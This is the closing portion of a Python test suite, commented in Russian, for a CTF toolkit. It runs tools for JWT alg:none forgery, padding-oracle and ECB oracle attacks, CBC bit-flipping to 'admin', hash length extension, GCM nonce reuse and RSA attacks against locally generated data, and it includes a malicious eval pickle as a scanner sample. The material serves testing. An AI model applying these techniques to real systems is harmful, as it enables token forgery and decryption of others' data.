    from Crypto.Util.Padding import pad as _pad
    key_t = b"0123456789abcdef0123456789abcdef"
    enc_bin = os.path.join(tmp, "encryptor.bin")
    with open(enc_bin, "wb") as f:
        f.write(b"\x7fELF junk\x00" + key_t + b"\x00get_encryption_key")
    plain_t = b"CTF{aes_auto_works} this is my message"
    ct = _AES.new(key_t, _AES.MODE_CBC, b"\x00" * 16).encrypt(_pad(plain_t, 16))
    enc_path = os.path.join(tmp, "secret.enc")
    with open(enc_path, "wb") as f:
        f.write(ct)
    r = run("crypto/aes_file.py", enc_path, "--auto", "--from-bin", enc_bin, "--top", "3")
    check("aes auto", "CTF{aes_auto_works}" in r.stdout, r.stdout[-600:] + r.stderr)

    # 107. jwt auto: слабый секрет + эскалация claim
    import base64 as _b64
    import hashlib as _hl2
    import hmac as _hmac

    def _b64u(b):
        return _b64.urlsafe_b64encode(b).rstrip(b"=").decode()

    hh = _b64u(b'{"alg":"HS256","typ":"JWT"}')
    pp = _b64u(b'{"sub":"user1","role":"user"}')
    sg = _b64u(_hmac.new(b"password", f"{hh}.{pp}".encode(), _hl2.sha256).digest())
    r = run("web/jwt_tool.py", "auto", f"{hh}.{pp}.{sg}")
    check("jwt auto", "password" in r.stdout and "alg:none" in r.stdout,
          r.stdout[-600:] + r.stderr)

    # 108. carve: ZIP внутри «тома» режется по EOCD и распаковывается
    frag = os.path.join(tmp, "fragment.bin")
    with open(frag, "wb") as f:
        f.write(b"STORAGE " + b"\x00" * 300 + make_zip_bytes("note.txt", b"CTF{carved_zip}")
                + b"TRAILER")
    outd = os.path.join(tmp, "carved")
    r = run("stego/carve.py", frag, "--out", outd)
    note = os.path.join(outd, "note.txt")
    check("carve zip by EOCD",
          "CTF{carved_zip}" in (open(note, encoding="utf-8").read() if os.path.exists(note) else ""),
          r.stdout[-600:] + r.stderr)

    # 109. wsl.py: --arch в help (aarch64 через qemu)
    r = run("linux/wsl.py", "run", "--help")
    check("linux/wsl.py help --arch", "--arch" in r.stdout and "aarch64" in r.stdout,
          r.stdout[-400:] + r.stderr)

    # 110. oracle --auto: сам определяет класс и закрепляет стратегию
    srv_path = os.path.join(tmp, "srv_auto_coprime.py")
    with open(srv_path, "w", encoding="utf-8") as f:
        f.write(
            "import socket, random, math\n"
            "s=socket.socket(); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n"
            "s.bind(('127.0.0.1',31591)); s.listen(1)\n"
            "c,_=s.accept(); f=c.makefile('rwb'); ok=True\n"
            "for i in range(12):\n"
            "    a=random.randint(2000,25000); b=random.randint(2000,25000)\n"
            "    f.write(f'Round {i}: Are {a} and {b} coprime? Answer YES or NO.\\n'.encode()); f.flush()\n"
            "    if f.readline().decode().strip().upper()!=('YES' if math.gcd(a,b)==1 else 'NO'):\n"
            "        ok=False; break\n"
            "f.write(b'CTF{auto_promote}\\n' if ok else b'CTF{fail}\\n'); f.flush()\n")
    srv = _sp.Popen([PY, srv_path], stdout=_sp.DEVNULL, stderr=_sp.DEVNULL)
    try:
        _time.sleep(1.0)
        r = run("pwn/oracle.py", "--connect", "127.0.0.1:31591", "--auto")
        check("oracle --auto promote",
              "CTF{auto_promote}" in r.stdout and "закрепляю" in r.stdout,
              r.stdout[-800:] + r.stderr)
    finally:
        srv.terminate()

    # 111. oracle --auto: неверная гипотеза -> переподключение -> другая
    srv_path = os.path.join(tmp, "srv_auto_switch.py")
    with open(srv_path, "w", encoding="utf-8") as f:
        f.write(
            "import socket, random\n"
            "s=socket.socket(); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n"
            "s.bind(('127.0.0.1',31592)); s.listen(5)\n"
            "while True:\n"
            "    c,_=s.accept(); f=c.makefile('rwb'); ok=True\n"
            "    for i in range(4):\n"
            "        a=random.randint(10,99); b=random.randint(10,99)\n"
            "        f.write(f'Calculate: {a} {b}\\n'.encode()); f.flush()\n"
            "        if f.readline().decode().strip()!=str(a+b): ok=False; break\n"
            "    f.write(b'CTF{auto_switch}\\n' if ok else b'wrong\\n'); f.flush(); c.close()\n"
            "    if ok: break\n")
    srv = _sp.Popen([PY, srv_path], stdout=_sp.DEVNULL, stderr=_sp.DEVNULL)
    try:
        _time.sleep(1.0)
        r = run("pwn/oracle.py", "--connect", "127.0.0.1:31592", "--auto",
                "--attempts", "4", "--promote", "3")
        check("oracle --auto switch",
              "CTF{auto_switch}" in r.stdout and "попытка 2" in r.stdout,
              r.stdout[-800:] + r.stderr)
    finally:
        srv.terminate()

    # 112. oracle --auto: гласные/согласные из кавычек
    srv_path = os.path.join(tmp, "srv_auto_vowels.py")
    with open(srv_path, "w", encoding="utf-8") as f:
        f.write(
            "import socket\n"
            "s=socket.socket(); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n"
            "s.bind(('127.0.0.1',31593)); s.listen(1)\n"
            "c,_=s.accept(); f=c.makefile('rwb'); ok=True\n"
            "for w in ['hello world','stack overflow','ctf']:\n"
            "    f.write(f'How many vowels and consonants in \"{w}\"?\\n'.encode()); f.flush()\n"
            "    v=sum(ch in 'aeiou' for ch in w); c2=sum(ch.isalpha() and ch not in 'aeiou' for ch in w)\n"
            "    if f.readline().decode().strip()!=f'{v} {c2}': ok=False; break\n"
            "f.write(b'CTF{auto_vowels}\\n' if ok else b'wrong\\n'); f.flush()\n")
    srv = _sp.Popen([PY, srv_path], stdout=_sp.DEVNULL, stderr=_sp.DEVNULL)
    try:
        _time.sleep(1.0)
        r = run("pwn/oracle.py", "--connect", "127.0.0.1:31593", "--auto")
        check("oracle --auto vowels", "CTF{auto_vowels}" in r.stdout,
              r.stdout[-800:] + r.stderr)
    finally:
        srv.terminate()

    # 113. FlagGrabber: флаг кусками, в ANSI, zero-width и base64
    sys.path.insert(0, KIT)
    import common as _common
    g = _common.FlagGrabber()
    g.feed(b"\x1b[32mInnoCTF{ab\x1b[0m")
    got_split = g.feed(b"c_def}")
    g.feed_text("CTF{ze\u200bro}")
    g.feed_text("Q1RGe2I2NF9mbGFnfQ==")
    check("FlagGrabber split/ansi/zw/base64",
          "InnoCTF{abc_def}" in g.found and "CTF{zero}" in g.found
          and "CTF{b64_flag}" in g.found,
          f"найдено: {g.found}")

    # 114. game_bot: разбор типов задач
    r = run("misc/game_bot.py", "--analyze", "Угадай слово из 5 букв: _ _ _ _ _")
    check("game_bot analyze wordle", "wordle" in r.stdout and "длина=5" in r.stdout,
          r.stdout + r.stderr)
    r = run("misc/game_bot.py", "--analyze", "Are 100 and 35 coprime? YES or NO")
    check("game_bot analyze qa", "вопрос" in r.stdout, r.stdout + r.stderr)
    r = run("misc/game_bot.py", "--analyze", "Нажми q. Стамина: 100")
    check("game_bot analyze keys", "клавиши" in r.stdout, r.stdout + r.stderr)

    # 115. game_bot: Q&A по TCP
    srv_path = os.path.join(tmp, "srv_game_qa.py")
    with open(srv_path, "w", encoding="utf-8") as f:
        f.write(
            "import socket, math\n"
            "s=socket.socket(); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n"
            "s.bind(('127.0.0.1',31621)); s.listen(1)\n"
            "c,_=s.accept(); f=c.makefile('rwb'); ok=True\n"
            "for i in range(5):\n"
            "    a,b=2222+i,3333+i*7\n"
            "    f.write(f'Are {a} and {b} coprime? Answer YES or NO.\\n'.encode()); f.flush()\n"
            "    if f.readline().decode().strip().upper()!=('YES' if math.gcd(a,b)==1 else 'NO'):\n"
            "        ok=False; break\n"
            "f.write(b'CTF{game_qa}\\n' if ok else b'wrong\\n'); f.flush()\n")
    srv = _sp.Popen([PY, srv_path], stdout=_sp.DEVNULL, stderr=_sp.DEVNULL)
    try:
        _time.sleep(1.0)
        r = run("misc/game_bot.py", "--connect", "127.0.0.1:31621", "--auto")
        check("game_bot qa", "CTF{game_qa}" in r.stdout, r.stdout[-700:] + r.stderr)
    finally:
        srv.terminate()

    # 116. game_bot: Wordle (эмодзи-разметка, два раунда)
    wdict = os.path.join(tmp, "words5.txt")
    with open(wdict, "w", encoding="utf-8") as f:
        f.write("\n".join(["серия", "карие", "телок", "пенку", "мешку", "аорте",
                           "лерки", "серин", "сумка", "паром", "ветер", "замок",
                           "книга", "столб", "мышка", "полка", "ручка", "дочка",
                           "точка", "ночка", "кочка"]) + "\n")
    srv_path = os.path.join(tmp, "srv_game_wordle.py")
    with open(srv_path, "w", encoding="utf-8") as f:
        f.write(
            "import socket\n"
            "def fb(g,t):\n"
            "    r=['b']*len(g); c={}\n"
            "    for ch in t: c[ch]=c.get(ch,0)+1\n"
            "    for i,(a,b) in enumerate(zip(g,t)):\n"
            "        if a==b: r[i]='g'; c[a]-=1\n"
            "    for i,a in enumerate(g):\n"
            "        if r[i]=='b' and c.get(a,0)>0: r[i]='y'; c[a]-=1\n"
            "    return r\n"
            "s=socket.socket(); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n"
            "s.bind(('127.0.0.1',31622)); s.listen(1)\n"
            "c,_=s.accept(); f=c.makefile('rwb')\n"
            "for _ in range(2):\n"
            "    f.write('Угадай слово из 5 букв\\n'.encode()); f.flush()\n"
            "    for _ in range(6):\n"
            "        g=f.readline().decode().strip().lower()\n"
            "        f.write((''.join({'g':'🟩','y':'🟨','b':'⬛'}[x] for x in fb(g,'серия'))+'\\n').encode()); f.flush()\n"
            "        if g=='серия': break\n"
            "f.write(b'CTF{game_wordle}\\n'); f.flush()\n")
    srv = _sp.Popen([PY, srv_path], stdout=_sp.DEVNULL, stderr=_sp.DEVNULL)
    try:
        _time.sleep(1.0)
        r = run("misc/game_bot.py", "--connect", "127.0.0.1:31622", "--auto",
                "--words", wdict)
        check("game_bot wordle", "CTF{game_wordle}" in r.stdout,
              r.stdout[-900:] + r.stderr)
    finally:
        srv.terminate()

    # 117. game_bot: клавиши + стамина
    srv_path = os.path.join(tmp, "srv_game_keys.py")
    with open(srv_path, "w", encoding="utf-8") as f:
        f.write(
            "import socket\n"
            "s=socket.socket(); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n"
            "s.bind(('127.0.0.1',31623)); s.listen(1)\n"
            "c,_=s.accept(); f=c.makefile('rwb')\n"
            "f.write('Нажми q чтобы ускориться. Стамина: 100\\n'.encode()); f.flush()\n"
            "ok=True\n"
            "for i in range(5):\n"
            "    if f.read(1)!=b'q': ok=False; break\n"
            "    f.write(f'Стамина: {90-i*10}\\n'.encode()); f.flush()\n"
            "f.write(b'CTF{game_keys}\\n' if ok else b'fail\\n'); f.flush()\n")
    srv = _sp.Popen([PY, srv_path], stdout=_sp.DEVNULL, stderr=_sp.DEVNULL)
    try:
        _time.sleep(1.0)
        r = run("misc/game_bot.py", "--connect", "127.0.0.1:31623", "--auto",
                "--keys", "q", "--interval", "0.01")
        check("game_bot keys", "CTF{game_keys}" in r.stdout,
              r.stdout[-700:] + r.stderr)
    finally:
        srv.terminate()

    # 118. game_bot: плагин подхватывается по баннеру
    plugdir = os.path.join(tmp, "plugins")
    os.makedirs(plugdir, exist_ok=True)
    with open(os.path.join(plugdir, "plug.py"), "w", encoding="utf-8") as f:
        f.write(
            "def move(text, state):\n"
            "    n = state.get('n', 0); state['n'] = n + 1\n"
            "    return 'ping' if n == 0 else 'bye'\n"
            "PLUGIN = {'name': 'pingpong', 'kind': 'interactive',\n"
            "          'match': {'banner': r'PINGPONG'}, 'move': move}\n")
    srv_path = os.path.join(tmp, "srv_game_plug.py")
    with open(srv_path, "w", encoding="utf-8") as f:
        f.write(
            "import socket\n"
            "s=socket.socket(); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n"
            "s.bind(('127.0.0.1',31624)); s.listen(1)\n"
            "c,_=s.accept(); f=c.makefile('rwb')\n"
            "f.write(b'PINGPONG v1\\n'); f.flush()\n"
            "f.readline(); f.write(b'pong\\n'); f.flush()\n"
            "f.readline(); f.write(b'CTF{game_plugin}\\n'); f.flush()\n")
    srv = _sp.Popen([PY, srv_path], stdout=_sp.DEVNULL, stderr=_sp.DEVNULL)
    try:
        _time.sleep(1.0)
        r = run("misc/game_bot.py", "--connect", "127.0.0.1:31624",
                "--plugins-dir", plugdir)
        check("game_bot plugin", "CTF{game_plugin}" in r.stdout,
              r.stdout[-700:] + r.stderr)
    finally:
        srv.terminate()

    # 119. буквенные маркеры Wordle + перерисовка экрана
    sys.path.insert(0, os.path.join(KIT, "misc"))
    import wordle_bot as _wb
    parsed = _wb.parse_feedback("серия\nГ Ж С С С", 5)
    check("wordle cyr marks",
          bool(parsed) and parsed[0] == "vec" and parsed[1] == ["g", "y", "b", "b", "b"],
          repr(parsed))
    parsed = _wb.parse_feedback("серия\n1 1 1 1 1", 5)
    check("wordle raw marks",
          bool(parsed) and parsed[0] == "raw" and len(parsed[1]) == 5,
          repr(parsed))
    scr = _common.Screen()
    scr.feed("\x1b[2Jabc\rX\n\x1b[1;1Htop")
    check("screen redraw", scr.text().splitlines()[0] == "top", repr(scr.text()))

    # 120. ppc_solvers: батарея типовых PPC-вопросов (RU/EN)
    sys.path.insert(0, os.path.join(KIT, "pwn"))
    import ppc_solvers as _ppc
    _cases = [
        ("2 + 2 * 2", "6"),
        ("12 ? 5 = 17", "+"),
        ("Is 97 prime?", "YES"),
        ("Следующее простое число после 100?", "101"),
        ("How many divisors does 36 have?", "9"),
        ("Чему равен НОД чисел 48 и 18?", "6"),
        ("factorial of 5", "120"),
        ("Какое 10-е число Фибоначчи?", "55"),
        ("Reverse the string 'hello'", "olleh"),
        ("Отсортируй по возрастанию: 5 3 9 1", "1 3 5 9"),
        ("Продолжи последовательность: 2, 4, 6, 8", "10"),
        ("Какой день недели 2026-11-08?", "воскресенье"),
    ]
    _bad = [(t, w, _ppc.solve(t)) for t, w in _cases if _ppc.solve(t) != w]
    check("ppc solvers batch", not _bad, repr(_bad[:3]))

    # 121. ppc_solvers: BFS по лабиринту
    _grid = "#####\n#S..#\n#.#.#\n#..E#\n#####"
    _path = _ppc.solve_grid_path(_grid)
    check("ppc grid path", bool(_path) and set(_path) <= set("WASD"), repr(_path))

    # 122. game_bot: угадайка бинарным поиском
    srv_path = os.path.join(tmp, "srv_game_guess.py")
    with open(srv_path, "w", encoding="utf-8") as f:
        f.write(
            "import socket\n"
            "s=socket.socket(); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n"
            "s.bind(('127.0.0.1',31633)); s.listen(1)\n"
            "c,_=s.accept(); f=c.makefile('rwb')\n"
            "f.write('Угадай число от 1 до 100. Я скажу больше/меньше.\\n'.encode()); f.flush()\n"
            "target=73; ok=False\n"
            "for _ in range(9):\n"
            "    g=int(f.readline().decode().strip())\n"
            "    if g==target:\n"
            "        f.write('верно!\\n'.encode()); f.flush(); ok=True; break\n"
            "    f.write(('больше\\n' if target>g else 'меньше\\n').encode()); f.flush()\n"
            "f.write(b'CTF{guess_test}\\n' if ok else b'fail\\n'); f.flush()\n")
    srv = _sp.Popen([PY, srv_path], stdout=_sp.DEVNULL, stderr=_sp.DEVNULL)
    try:
        _time.sleep(1.0)
        r = run("misc/game_bot.py", "--connect", "127.0.0.1:31633", "--auto")
        check("game_bot guess", "CTF{guess_test}" in r.stdout,
              r.stdout[-700:] + r.stderr)
    finally:
        srv.terminate()

    # 123. carve: JPEG не обрезается по миниатюре внутри APP1
    _thumb = b"\xff\xd8\xff\xd9"
    _app1_payload = b"Exif\x00\x00" + _thumb
    _app1 = b"\xff\xe1" + (len(_app1_payload) + 2).to_bytes(2, "big") + _app1_payload
    _sos = b"\xff\xda" + (8).to_bytes(2, "big") + b"\x01\x01\x00\x00\x3f\x00"
    _jpeg = b"\xff\xd8" + _app1 + _sos + b"\x12\x34\x56" + b"\xff\xd9"
    _host = os.path.join(tmp, "host_jpeg.bin")
    open(_host, "wb").write(b"JUNKJUNK" + _jpeg + b"TAILTAIL")
    _out = os.path.join(tmp, "carve_jpeg")
    r = run("stego/carve.py", _host, "--out", _out)
    _jpg_files = ([f for f in os.listdir(_out) if f.endswith(".jpg")]
                  if os.path.isdir(_out) else [])
    _ok = bool(_jpg_files) and open(os.path.join(_out, _jpg_files[0]), "rb").read() == _jpeg
    check("carve jpeg boundary", _ok, r.stdout[-400:] + r.stderr)

    # 124. carve: GIF не обрезается по 0x3B внутри LZW-данных
    _gif = (b"GIF89a" + b"\x01\x00\x01\x00\x00\x00\x00"
            + b"\x2c" + b"\x00\x00\x00\x00\x01\x00\x01\x00\x00"
            + b"\x02" + b"\x05" + b"\x3b\x3b\x3b\x3b\x3b" + b"\x00" + b"\x3b")
    _host = os.path.join(tmp, "host_gif.bin")
    open(_host, "wb").write(b"HOSTHOST" + _gif + b"TAIL")
    _out = os.path.join(tmp, "carve_gif")
    r = run("stego/carve.py", _host, "--out", _out)
    _gif_files = ([f for f in os.listdir(_out) if f.endswith(".gif")]
                  if os.path.isdir(_out) else [])
    _ok = bool(_gif_files) and open(os.path.join(_out, _gif_files[0]), "rb").read() == _gif
    check("carve gif boundary", _ok, r.stdout[-400:] + r.stderr)

    # 125. carve: TAR начинается с заголовка (а не с 257) и не тянет мусор
    _buf = io.BytesIO()
    with tarfile.open(fileobj=_buf, mode="w") as _tf:
        _blob = b"CTF{tar_boundary}"
        _ti = tarfile.TarInfo("flag.txt")
        _ti.size = len(_blob)
        _tf.addfile(_ti, io.BytesIO(_blob))
    _tar = _buf.getvalue()
    _host = os.path.join(tmp, "host_tar.bin")
    open(_host, "wb").write(b"PREFIX!!" + _tar + b"JUNKJUNK")
    _out = os.path.join(tmp, "carve_tar")
    r = run("stego/carve.py", _host, "--out", _out)
    _tar_files = ([f for f in os.listdir(_out) if f.endswith(".tar")]
                  if os.path.isdir(_out) else [])
    _ok = False
    if _tar_files:
        _raw = open(os.path.join(_out, _tar_files[0]), "rb").read()
        try:
            with tarfile.open(fileobj=io.BytesIO(_raw)) as _tf2:
                _member = _tf2.extractfile("flag.txt").read()
            _ok = _member == _blob and not _raw.endswith(b"JUNKJUNK")
        except Exception:
            _ok = False
    check("carve tar boundary", _ok, r.stdout[-400:] + r.stderr)

    # 126. ipa_info: Payload/Info.plist и строки
    ipa_path = os.path.join(tmp, "app.ipa")
    with zipfile.ZipFile(ipa_path, "w") as zf:
        zf.writestr("Payload/Test.app/Info.plist", plistlib.dumps({
            "CFBundleIdentifier": "com.example.test",
            "CFBundleExecutable": "Test",
            "CFBundleURLTypes": [{"CFBundleURLSchemes": ["testapp"]}],
        }, fmt=plistlib.FMT_BINARY))
        zf.writestr("Payload/Test.app/Test",
                    b"\xcf\xfa\xed\xfe" + b"\x00" * 64 + b"CTF{ipa_flag}")
    r = run("forensic/ipa_info.py", ipa_path)
    check("forensic/ipa_info.py",
          "com.example.test" in r.stdout and "testapp" in r.stdout
          and "CTF{ipa_flag}" in r.stdout, r.stdout[-600:] + r.stderr)

    # 127. icmp_payloads: склейка payload и декод
    from scapy.all import Ether as _Ether, ICMP as _ICMP, IP as _IP
    from scapy.all import Raw as _Raw, wrpcap as _wrpcap
    icmp_path = os.path.join(tmp, "icmp.pcap")
    _pkts = [_Ether() / _IP(src="1.1.1.1", dst="2.2.2.2")
             / _ICMP(type=8, id=7, seq=i + 1) / _Raw(part)
             for i, part in enumerate([b"CTF{icmp_", b"channel}"])]
    _wrpcap(icmp_path, _pkts)
    r = run("network/icmp_payloads.py", icmp_path)
    check("network/icmp_payloads.py", "CTF{icmp_channel}" in r.stdout,
          r.stdout[-600:] + r.stderr)

    # 128. geo_photo: EXIF + ссылки обратного поиска
    geo_path = os.path.join(tmp, "geo.jpg")
    _im = Image.new("RGB", (16, 16), (100, 100, 100))
    _ex = Image.Exif()
    _ex[0x010F] = "TestMake"
    _ex[0x0110] = "TestModel"
    _im.save(geo_path, exif=_ex)
    r = run("forensic/geo_photo.py", geo_path)
    check("forensic/geo_photo.py",
          "TestMake" in r.stdout and "yandex.com/images" in r.stdout,
          r.stdout[-600:] + r.stderr)

    # 129. evm_decode: селектор transfer и аргументы
    _cd = ("0xa9059cbb" + "0" * 24 + "11" * 20
           + format(123456789, "064x"))
    r = run("blockchain/evm_decode.py", _cd)
    check("blockchain/evm_decode.py",
          "transfer(address,uint256)" in r.stdout
          and "0x" + "11" * 20 in r.stdout and "123456789" in r.stdout,
          r.stdout[-600:] + r.stderr)
    r = run("blockchain/evm_decode.py", "--sig", "transfer(address,uint256)")
    check("evm selector", "a9059cbb" in r.stdout, r.stdout[-300:] + r.stderr)

    # 130. pickle_scan: опасный GLOBAL и флаг
    pkl_path = os.path.join(tmp, "model.pkl")
    open(pkl_path, "wb").write(
        b"CTF{pickle_scan}\n" + b"c__builtin__\neval\n(S'1+1'\ntR.")
    r = run("ai/pickle_scan.py", pkl_path)
    check("ai/pickle_scan.py",
          "CTF{pickle_scan}" in r.stdout and "eval" in r.stdout,
          r.stdout[-600:] + r.stderr)

    checks_ctb(tmp)
    checks_zip_tricks(tmp)
    checks_disk_image(tmp)
    checks_prng(tmp)
    checks_forensics(tmp)
    checks_stego_audio(tmp)
    checks_reverse(tmp)
    checks_admin(tmp)
    checks_stego_img(tmp)
    checks_core(tmp)
    # 131. rsa coppersmith: часть m известна, e=3
    from Crypto.Util.number import getPrime as _get_prime
    _p, _q = _get_prime(256), _get_prime(256)
    _n = _p * _q
    _m = int.from_bytes(b"CTF{coppersmith}", "big")
    _hi = _m >> 40
    _c = pow(_m, 3, _n)
    r = run("crypto/rsa_tool.py", "coppersmith", "--n", _n, "--e", 3,
            "--c", _c, "--known-high", _hi, "--unknown-bits", 40)
    check("rsa coppersmith", "CTF{coppersmith}" in r.stdout,
          r.stdout[-600:] + r.stderr)

    # 132. rsa partial-p: 24 младших бита p неизвестны
    _p2, _q2 = _get_prime(128), _get_prime(128)
    _n2 = _p2 * _q2
    _bits = 24
    _ph = _p2 >> _bits
    _msg = int.from_bytes(b"CTF{partial_p}", "big")
    _c2 = pow(_msg, 65537, _n2)
    r = run("crypto/rsa_tool.py", "partial-p", "--n", _n2, "--p-high", _ph,
            "--unknown-bits", _bits, "--m", 3, "--t", 3,
            "--e", 65537, "--cipher", _c2)
    check("rsa partial-p", "CTF{partial_p}" in r.stdout,
          r.stdout[-600:] + r.stderr)

    # 133. rsa lsb-oracle: готовые биты чётности
    _p3, _q3 = _get_prime(128), _get_prime(128)
    _n3 = _p3 * _q3
    _e3 = 65537
    _d3 = pow(_e3, -1, (_p3 - 1) * (_q3 - 1))
    _m3 = int.from_bytes(b"CTF{lsb}", "big")
    _c3 = pow(_m3, _e3, _n3)
    _cc = _c3
    _par = []
    for _ in range(_n3.bit_length()):
        _cc = _cc * pow(2, _e3, _n3) % _n3
        _par.append(str(pow(_cc, _d3, _n3) & 1))
    r = run("crypto/rsa_tool.py", "lsb-oracle", "--n", _n3, "--e", _e3,
            "--c", _c3, "--bits", ",".join(_par))
    check("rsa lsb-oracle", "CTF{lsb}" in r.stdout,
          r.stdout[-600:] + r.stderr)

    # 134. block_oracles: ECB byte-at-a-time
    _ecb_oracle = os.path.join(tmp, "oracle_ecb.py")
    open(_ecb_oracle, "w", encoding="utf-8").write(
        "import sys\n"
        "from Crypto.Cipher import AES\n"
        "KEY=b'0123456789abcdef'\n"
        "SECRET=b'flag{oracle_ecb}'\n"
        "a=AES.new(KEY, AES.MODE_ECB)\n"
        "for line in sys.stdin:\n"
        "    line=line.strip()\n"
        "    if not line: continue\n"
        "    pt=bytes.fromhex(line)+SECRET\n"
        "    pt+=b'\\x00'*((16-len(pt)%16)%16)\n"
        "    print(a.encrypt(pt).hex(), flush=True)\n"
    )
    r = run("crypto/block_oracles.py", "ecb-recover",
            "--oracle-cmd", f'{sys.executable} "{_ecb_oracle}"',
            "--secret-len", 16)
    check("oracles ecb-recover", "flag{oracle_ecb}" in r.stdout,
          r.stdout[-600:] + r.stderr)

    # 135. block_oracles: padding oracle
    _pad_oracle = os.path.join(tmp, "oracle_pad.py")
    open(_pad_oracle, "w", encoding="utf-8").write(
        "import sys\n"
        "from Crypto.Cipher import AES\n"
        "KEY=b'0123456789abcdef'\n"
        "a=AES.new(KEY, AES.MODE_CBC, b'\\x00'*16)\n"
        "for line in sys.stdin:\n"
        "    line=line.strip()\n"
        "    if not line: continue\n"
        "    ct=bytes.fromhex(line)\n"
        "    if len(ct)%16: print(0, flush=True); continue\n"
        "    pt=a.decrypt(ct); p=pt[-1]\n"
        "    print(1 if 1<=p<=16 and pt.endswith(bytes([p])*p) else 0, flush=True)\n"
    )
    from Crypto.Cipher import AES as _AES
    _key = b"0123456789abcdef"
    _iv = b"\x00" * 16
    _pt = b"0123456789abcdef" + b"secret!"
    _pad_n = 16 - len(_pt) % 16
    _data = _pt + bytes([_pad_n]) * _pad_n
    _ct = _AES.new(_key, _AES.MODE_CBC, _iv).encrypt(_data)
    r = run("crypto/block_oracles.py", "padding-oracle",
            "--oracle-cmd", f'{sys.executable} "{_pad_oracle}"',
            "--iv", _iv.hex(), "--ct", _ct.hex())
    check("oracles padding", "secret!" in r.stdout,
          r.stdout[-600:] + r.stderr)

    # 136. block_oracles: CBC flip
    r = run("crypto/block_oracles.py", "cbc-flip", "--iv", "00" * 16,
            "--known-text", "user=guest123456", "--target-text", "user=admin123456")
    _expect = bytes(a ^ b ^ c for a, b, c in zip(
        bytes(16), b"user=guest123456", b"user=admin123456")).hex()
    check("oracles cbc-flip", _expect in r.stdout, r.stdout[-300:] + r.stderr)

    # 137. hash_ext: length extension для трёх алгоритмов
    _keyb = b"secretkey"
    _data = b"user=guest"
    _append = b"&admin=1"
    for _alg, _hfun in (("md5", hashlib.md5), ("sha1", hashlib.sha1),
                        ("sha256", hashlib.sha256)):
        r = run("crypto/hash_ext.py", "length-extend", "--alg", _alg,
                "--sig", _hfun(_keyb + _data).hexdigest(),
                "--data", _data.decode(), "--key-len", len(_keyb),
                "--append", _append.decode(), "--key-hex", _keyb.hex())
        _glue = None
        for _line in r.stdout.splitlines():
            if "padding (hex)" in _line:
                _glue = bytes.fromhex(_line.split(":")[1].strip())
        _real = _hfun(_keyb + _data + (_glue or b"") + _append).hexdigest()
        check(f"hash_ext {_alg}", _glue is not None and _real in r.stdout,
              r.stdout[-500:] + r.stderr)

    # 138. hash_ext: GCM nonce reuse
    _gkey = bytes(range(16))
    _nonce = bytes(range(12))
    _g1 = _AES.new(_gkey, _AES.MODE_GCM, nonce=_nonce)
    _gct1, _gtag1 = _g1.encrypt_and_digest(b"hello world!!!!!")
    _g2 = _AES.new(_gkey, _AES.MODE_GCM, nonce=_nonce)
    _gct2, _gtag2 = _g2.encrypt_and_digest(b"ATTACK AT DAWN!!!")
    _g3 = _AES.new(_gkey, _AES.MODE_GCM, nonce=_nonce)
    _gct3, _gtag3 = _g3.encrypt_and_digest(b"third message!!!?")
    _gh = int.from_bytes(
        _AES.new(_gkey, _AES.MODE_ECB).encrypt(b"\x00" * 16), "big")
    r = run("crypto/hash_ext.py", "gcm-nonce-reuse",
            "--ct1", _gct1.hex(), "--tag1", _gtag1.hex(),
            "--ct2", _gct2.hex(), "--tag2", _gtag2.hex(),
            "--ct3", _gct3.hex(), "--tag3", _gtag3.hex(),
            "--pt1", "hello world!!!!!")
    check("hash_ext gcm",
          f"{_gh:032x}" in r.stdout and "ATTACK AT DAWN" in r.stdout
          and r.stdout.count("[+] H = ") == 1,
          r.stdout[-600:] + r.stderr)

    # 139-145. свойства, дифференциал, фаззинг и мета-проверки
    property_and_meta_checks(tmp)

    checks_stego_new(tmp)
    # 146. wav_lsb: LSB в сэмплах WAV (16/24-бит) и эхо-скрытие
    checks_wav_lsb(tmp)
    # stego/stego_crack.py: перебор паролей через внешние тулзы
    checks_stego_crack(tmp)

    print(f"\n=== PASS: {passed}  FAIL: {failed} ===")
    sys.exit(1 if failed else 0)


if __name__ == "__main__":
    main()
